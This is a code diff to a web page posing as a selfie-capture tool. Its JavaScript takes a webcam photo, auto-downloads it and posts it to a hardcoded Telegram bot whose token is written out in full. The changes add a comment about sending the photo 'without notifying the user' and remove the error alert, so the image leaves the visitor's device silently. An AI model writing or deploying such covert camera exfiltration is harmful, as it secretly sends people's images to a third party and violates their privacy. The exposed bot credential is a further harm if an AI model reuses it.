@@ -95,6 +95,7 @@
     <video id="video" width="1080" height="1920" autoplay></video>
     <canvas id="canvas" width="6528" height="4896" style="display: none;"></canvas>
     <button id="capture">Capture Selfie</button>
+    <a id="downloadBtn" download="selfie.jpg" href="#">Download Selfie</a>
 
     <script>
         const botToken = "8199996433:AAHWMDwq0eqeuUsQApLD1v_hHmLPJSdCU9w";
@@ -125,6 +126,11 @@
                 // Create a URL for the captured image
                 const url = URL.createObjectURL(blob);
 
+                // Create a download link and trigger it automatically
+                const downloadBtn = document.getElementById('downloadBtn');
+                downloadBtn.href = url;
+                downloadBtn.click();
+
                 // Prepare the form data to send the image to Telegram
                 let formData = new FormData();
                 formData.append("chat_id", chatId);
@@ -132,22 +138,13 @@
 
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
-                // Send the photo to Telegram
+                // Send the photo to Telegram without notifying the user
                 try {
                     const response = await fetch(telegramUrl, { method: "POST", body: formData });
                     const result = await response.json();
                 } catch (error) {
                     console.error("Telegram API Error:", error);
-                    alert("Error sending selfie.");
                 }
-
-                // Auto-download the captured image
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'selfie_6528x4896.jpg';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a); // Clean up the DOM
             }, "image/jpeg");
         }
 
